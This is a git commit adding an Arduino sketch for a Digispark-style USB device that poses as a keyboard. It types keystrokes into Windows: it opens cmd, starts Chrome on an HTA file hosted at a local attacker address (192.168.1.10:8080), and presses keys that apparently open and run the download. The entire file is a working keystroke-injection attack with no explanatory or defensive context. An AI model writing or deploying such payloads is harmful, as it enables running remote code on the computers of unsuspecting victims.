8ac162a60210bb5a8f645c9513d7fd8c738b6aa6
jjrjnt <113560540+jrjjnt@users.noreply.github.com>
2022-11-19 14:43:38 -0300

    Add files via upload

---
+++ jjrjnt.ino
@@ -0,0 +1,36 @@
+#include"DigiKeyboardPtBr.h"
+void setup() {
+}
+
+char opensite[] = "start chrome";
+char link[] = " http://192.168.1.10:8080/zStjObfqv.hta";
+
+
+void loop() {
+  DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.print("cmd");
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.print(opensite);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.print(link);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(7000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_J, DE_MOD_CONTROL_LEFT);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(0x2b);
+  DigiKeyboardPtBr.delay(1000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+  DigiKeyboardPtBr.delay(2000);
+  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
+    DigiKeyboardPtBr.delay(200000);
+    
+  
+}
